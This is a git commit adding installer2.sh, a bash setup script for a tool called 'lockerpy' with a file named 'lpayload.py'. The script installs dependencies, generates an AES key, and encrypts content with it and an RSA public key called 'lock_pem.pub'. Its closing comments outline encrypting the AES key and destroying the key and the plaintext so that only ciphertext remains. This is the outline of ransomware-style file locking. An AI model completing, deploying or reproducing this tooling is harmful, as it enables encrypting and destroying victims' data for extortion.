4feddbf0e186c6c5867a8fcca0c6ebce2b777ca1
NeronNymus <jorge.gonzalez@cimat.mx>
2025-09-22 20:23:12 -0600

    update

---
+++ installer2.sh
@@ -0,0 +1,40 @@
+#!/bin/bash
+
+# This script sets up everything for running lockerpy
+
+set -e
+
+# Required system packages
+REQUIRED_PACKAGES=(git python3 virtualenv sudo)
+
+echo "[+] Installing required packages..."
+apt update || true
+apt install -y "${REQUIRED_PACKAGES[@]}"
+
+# Define paths
+rootPath="$(dirname "$(realpath "$0")")"
+envPath="$rootPath/Env"
+locker="$rootPath/lockerpy.py"
+payload="$rootPath/lpayload.py"
+
+# Create virtual environment
+echo "[+] Creating virtual environment..."
+virtualenv "$envPath" --python=python3
+
+# Activate and install Python dependencies
+echo "[+] Installing Python dependencies..."
+source "$envPath/bin/activate"
+pip install -r requirements.txt
+
+
+# Generate AES random key
+./locker.py -ag AES_keys/aes_key1
+
+# Cipher content with AES key
+./locker.py -re AES_keys/aes_key1 -rpub RSA/lock_pem.pub
+
+# Cipher AES key
+
+# Destroy AES key and plain content
+
+# Preserve only the ciphered version
